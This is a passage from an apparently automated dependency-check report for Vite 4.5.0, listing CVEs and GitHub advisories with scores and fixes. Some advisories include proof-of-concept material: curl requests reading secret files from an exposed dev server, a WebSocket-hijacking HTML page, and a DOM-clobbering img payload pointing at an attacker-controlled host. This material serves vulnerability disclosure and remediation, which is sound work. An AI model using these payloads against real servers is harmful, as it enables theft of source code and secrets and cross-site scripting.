Sonatype&apos;s research suggests that this CVE&apos;s details differ from those defined at NVD. See https://ossindex.sonatype.org/vulnerability/CVE-2024-45811 for details</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-45811?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-45811] CWE-200: Information Exposure</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-9cwx-2883-4wfx</url><name>https://github.com/advisories/GHSA-9cwx-2883-4wfx</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-45811</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-45811</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2025-32395</name><severity>HIGH</severity><cvssV2><score>8.199999809265137</score><accessVector>NETWORK</accessVector><accessComplexity>LOW</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>HIGH</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-200</cwe></cwes><description>Vite is a frontend tooling framework for javascript. Prior to 6.2.6, 6.1.5, 6.0.15, 5.4.18, and 4.5.13, the contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun. HTTP 1.1 spec (RFC 9112) does not allow # in request-target. Although an attacker can send such a request. For those requests with an invalid request-line (it includes request-target), the spec recommends to reject them with 400 or 301. The same can be said for HTTP 2. On Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of http.IncomingMessage.url contains #. Vite assumed req.url won&apos;t contain # when checking server.fs.deny, allowing those kinds of requests to bypass the check. Only apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) and running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun) are affected. This vulnerability is fixed in 6.2.6, 6.1.5, 6.0.15, 5.4.18, and 4.5.13.</description><references><reference><source>OSSIndex</source><url>https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2025-32395?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2025-32395] CWE-200: Information Exposure</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-32395</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-32395</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2024-23331</name><severity>HIGH</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-178</cwe></cwes><description>Vite is a frontend tooling framework for javascript. The Vite dev server option `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows. This bypass is similar to CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems. Since `picomatch` defaults to case-sensitive glob matching, but the file server doesn&apos;t discriminate; a blacklist bypass is possible. By requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. This issue has been addressed in vite@5.0.12, vite@4.5.2, vite@3.2.8, and vite@2.9.17. Users are advised to upgrade. Users unable to upgrade should restrict access to dev servers.</description><references><reference><source>OSSIndex</source><url>https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-23331</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-23331</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-23331?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-23331] CWE-178: Improper Handling of Case Sensitivity</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-c24v-8rfc-w8vw</name><severity unscored="true">high</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-178</cwe><cwe>CWE-200</cwe></cwes><description>### Summary
[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows.

This bypass is similar to https://nvd.nist.gov/vuln/detail/CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems.

### Patches
Fixed in vite@5.0.12, vite@4.5.2, vite@3.2.8, vite@2.9.17

### Details
Since `picomatch` defaults to case-sensitive glob matching, but the file server doesn&apos;t discriminate; a blacklist bypass is possible. 

See `picomatch`  usage, where `nocase` is defaulted to `false`: https://github.com/vitejs/vite/blob/v5.1.0-beta.1/packages/vite/src/node/server/index.ts#L632

By requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. 

### PoC
**Setup**
1. Created vanilla Vite project using `npm create vite@latest` on a Standard Azure hosted Windows 10 instance. 
    - `npm run dev -- --host 0.0.0.0`
    - Publicly accessible for the time being here: http://20.12.242.81:5173/ 
2. Created dummy secret files, e.g. `custom.secret` and `production.pem`
3. Populated `vite.config.js` with
```javascript
export default { server: { fs: { deny: [&apos;.env&apos;, &apos;.env.*&apos;, &apos;*.{crt,pem}&apos;, &apos;custom.secret&apos;] } } }
```

**Reproduction**
1. `curl -s http://20.12.242.81:5173/@fs//`
    - Descriptive error page reveals absolute filesystem path to project root
2. `curl -s http://20.12.242.81:5173/@fs/C:/Users/darbonzo/Desktop/vite-project/vite.config.js`
    - Discoverable configuration file reveals locations of secrets
3. `curl -s http://20.12.242.81:5173/@fs/C:/Users/darbonzo/Desktop/vite-project/custom.sEcReT`
    - Secrets are directly accessible using case-augmented version of filename

**Proof**
![Screenshot 2024-01-19 022736](https://user-images.githubusercontent.com/907968/298020728-3a8d3c06-fcfd-4009-9182-e842f66a6ea5.png)

### Impact
**Who**
- Users with exposed dev servers on environments with case-insensitive filesystems

**What**
- Files protected by `server.fs.deny` are both discoverable, and accessible</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-c24v-8rfc-w8vw</url><name>https://github.com/advisories/GHSA-c24v-8rfc-w8vw</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-23331</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-23331</name></reference><reference><source>NPM Advisory reference: </source><url>https://vitejs.dev/config/server-options.html#server-fs-deny</url><name>https://vitejs.dev/config/server-options.html#server-fs-deny</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2023-34092</url><name>https://nvd.nist.gov/vuln/detail/CVE-2023-34092</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/0cd769c279724cf27934b1270fbdd45d68217691</url><name>https://github.com/vitejs/vite/commit/0cd769c279724cf27934b1270fbdd45d68217691</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/91641c4da0a011d4c5352e88fc68389d4e1289a5</url><name>https://github.com/vitejs/vite/commit/91641c4da0a011d4c5352e88fc68389d4e1289a5</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/eeec23bbc9d476c54a3a6d36e78455867185a7cb</url><name>https://github.com/vitejs/vite/commit/eeec23bbc9d476c54a3a6d36e78455867185a7cb</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/a26c87d20f9af306b5ce3ff1648be7fa5146c278</url><name>https://github.com/vitejs/vite/commit/a26c87d20f9af306b5ce3ff1648be7fa5146c278</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&gt;\=4.0.0\&lt;\=4.5.1:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-vg6x-rcgg-rjx6</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-346</cwe><cwe>CWE-1385</cwe><cwe>CWE-350</cwe></cwes><description>### Summary
Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.

&gt; [!WARNING]
&gt; This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network.

### Upgrade Path
Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.

- Using the backend integration feature
- Using a reverse proxy in front of Vite
- Accessing the development server via a domain other than `localhost` or `*.localhost`
- Using a plugin / framework that connects to the WebSocket server on their own from the browser

#### Using the backend integration feature
If you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.

#### Using a reverse proxy in front of Vite
If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.

#### Accessing the development server via a domain other than `localhost` or `*.localhost`
You need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.

#### Using a plugin / framework that connects to the WebSocket server on their own from the browser
If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.

In that case, you can either:

- fix the plugin / framework code to the make it compatible with the new version of Vite
- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite
  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.

### Mitigation without upgrading Vite
#### [1]: Permissive default CORS settings
Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins.

#### [2]: Lack of validation on the Origin header for WebSocket connections
There aren&apos;t any mitigations for this.

#### [3]: Lack of validation on the Host header for HTTP requests
Use Chrome 94+ or use HTTPS for the development server.

### Details

There are three causes that allowed malicious websites to send any requests to the development server:

#### [1]: Permissive default CORS settings

Vite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker sends a `fetch(&apos;http://127.0.0.1:5173/main.js&apos;)` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that&apos;s not the case for the reasons above.
4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.

#### [2]: Lack of validation on the Origin header for WebSocket connections

Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker runs `new WebSocket(&apos;http://127.0.0.1:5173&apos;, &apos;vite-hmr&apos;)` by JS in that malicious web page.
4. The user edits some files.
5. Vite sends some HMR messages over WebSocket.
6. The attacker gets the content of the HMR messages.

#### [3]: Lack of validation on the Host header for HTTP requests

Unless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.

1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won&apos;t work).
2. The user accesses the malicious web page.
3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).
4. The attacker sends a `fetch(&apos;/main.js&apos;)` request by JS in that malicious web page.
5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.

### Impact
#### [1]: Permissive default CORS settings
Users with the default `server.cors` option may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

#### [2]: Lack of validation on the Origin header for WebSocket connections
All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.

For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.

For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.

#### [3]: Lack of validation on the Host header for HTTP requests
Users using HTTP for the development server and using a browser that is not Chrome 94+ may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

Chrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.

### Related Information
Safari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there&apos;s another condition of &quot;the malicious web page is served on HTTP&quot; to make [1] and [2] to work.

### PoC
#### [2]: Lack of validation on the Origin header for WebSocket connections
1. I used the `react` template which utilizes HMR functionality.

```
npm create vite@latest my-vue-app-react -- --template react
```

2. Then on a malicious server, serve the following POC html:
```html
&lt;!doctype html&gt;
&lt;html lang=&quot;en&quot;&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot; /&gt;
        &lt;title&gt;vite CSWSH&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div id=&quot;logs&quot;&gt;&lt;/div&gt;
        &lt;script&gt;
            const div = document.querySelectorAll(&apos;#logs&apos;)[0];
            const ws = new WebSocket(&apos;ws://localhost:5173&apos;,&apos;vite-hmr&apos;);
            ws.onmessage = event =&gt; {
                const logLine = document.createElement(&apos;p&apos;);
                logLine.innerHTML = event.data;
                div.append(logLine);
            };
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
```

3. Kick off Vite 

```
npm run dev
```

4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. 
5. Edit `src/App.jsx` file and intentionally place a syntax error
6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed

Here&apos;s a video demonstrating the POC:

https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</url><name>https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-24010</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-24010</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&lt;\=4.5.5:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-64vr-g452-qvp3</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.400000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>### Summary

We discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.

Note that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986

### Details

**Backgrounds**

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/

**Gadgets found in Vite**

We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.

However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&apos;s named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.

```
const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== &quot;.&quot;) relativePath = &quot;./&quot; + relativePath;
    return getResolveUrl(
      `require.toUrl(&apos;${escapeId(relativePath)}&apos;), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === &apos;undefined&apos; ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `&apos;${escapeId(partialEncodeURIPath(relativePath))}&apos;, import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `&apos;${escapeId(partialEncodeURIPath(relativePath))}&apos;, module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === &apos;undefined&apos; &amp;&amp; typeof location === &apos;undefined&apos; ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
```

### PoC

Considering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. 

```
// main.js
import extraURL from &apos;./extra.js?url&apos;
var s = document.createElement(&apos;script&apos;)
s.src = extraURL
document.head.append(s)
```

```
// extra.js
export default &quot;https://myserver/justAnOther.js&quot;
```

```
// vite.config.js
import { defineConfig } from &apos;vite&apos;

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: &quot;cjs&quot;
      },
    },
  },
  base: &quot;./&quot;,
});
```

After running the build command, the developer will get following bundle as the output.

```
// dist/index-DDmIg9VD.js
&quot;use strict&quot;;const t=&quot;&quot;+(typeof document&gt;&quot;u&quot;?require(&quot;url&quot;).pathToFileURL(__dirname+&quot;/extra-BLVEx9Lb.js&quot;).href:new URL(&quot;extra-BLVEx9Lb.js&quot;,document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement(&quot;script&quot;);e.src=t;document.head.append(e);
```

Adding the Vite bundled script, `dist/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker&apos;s domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website&apos;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.


```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name=&quot;currentScript&quot; src=&quot;https://attacker.controlled.server/&quot;&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type=&quot;module&quot; crossorigin src=&quot;/assets/index-DDmIg9VD.js&quot;&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
```

### Impact

This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.

### Patch

```
// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `&apos;${escapeId(partialEncodeURIPath(relativePath))}&apos;, ${
      umd ? `typeof document === &apos;undefined&apos; ? location.href : ` : &apos;&apos;
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === &apos;SCRIPT&apos; &amp;&amp; document.currentScript.src || document.baseURI`,
  )
```</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</url><name>https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-64vr-g452-qvp3</url><name>https://github.com/advisories/GHSA-64vr-g452-qvp3</name></reference><reference><source>NPM Advisory reference: </source><url>https://scnps.co/papers/sp23_domclob.pdf</url><name>https://scnps.co/papers/sp23_domclob.pdf</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-45812</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-45812</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</url><name>https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</name></reference><reference><source>NPM Advisory reference: </source><url>https://research.securitum.com/xss-in-amp4email-dom-clobbering</url><name>https://research.securitum.com/xss-in-amp4email-dom-clobbering</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</url><name>https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</url><name>https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</url><name>https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</url><name>https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</url><name>https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&gt;\=4.0.0\&lt;4.5.4:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2023-49293</name><severity>MEDIUM</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>Vite is a website frontend framework. When Vite&apos;s HTML transformation is invoked manually via `server.transformIndexHtml`, the original request URL is passed in unmodified, and the `html` being transformed contains inline module scripts (`&lt;script type=&quot;module&quot;&gt;...&lt;/script&gt;`), it is possible to inject arbitrary HTML into the transformed output by supplying a malicious URL query string to `server.transformIndexHtml`. Only apps using `appType: &apos;custom&apos;` and using the default Vite HTML middleware are affected. The HTML entry must also contain an inline script. The attack requires a user to click on a malicious URL while running the dev server. Restricted files aren&apos;t exposed to the attacker. This issue has been addressed in vite@5.0.5, vite@4.5.1, and vite@4.4.12. There are no known workarounds for this vulnerability.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-49293</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-49293</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2023-49293?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2023-49293] CWE-79: Improper Neutralization of Input During Web Page Generation (&apos;Cross-site Scripting&apos;)</name></reference><reference><source>OSSIndex</source><url>https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-92r3-m2mg-pj97</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>### Summary
When Vite&apos;s HTML transformation is invoked manually via `server.transformIndexHtml`, the original request URL is passed in unmodified, and the `html` being transformed contains inline module scripts (`&lt;script type=&quot;module&quot;&gt;...&lt;/script&gt;`), it is possible to inject arbitrary HTML into the transformed output by supplying a malicious URL query string to `server.transformIndexHtml`.

### Impact
Only apps using `appType: &apos;custom&apos;` and using the default Vite HTML middleware are affected. The HTML entry must also contain an inline script. The attack requires a user to click on a malicious URL while running the dev server. Restricted files aren&apos;t exposed to the attacker.

### Patches
Fixed in vite@5.0.5, vite@4.5.1, vite@4.4.12

### Details
Suppose `index.html` contains an inline module script:

```html
&lt;script type=&quot;module&quot;&gt;
  // Inline script
&lt;/script&gt;
```

This script is transformed into a proxy script like

```html
&lt;script type=&quot;module&quot; src=&quot;/index.html?html-proxy&amp;index=0.js&quot;&gt;&lt;/script&gt;
```

due to Vite&apos;s HTML plugin:

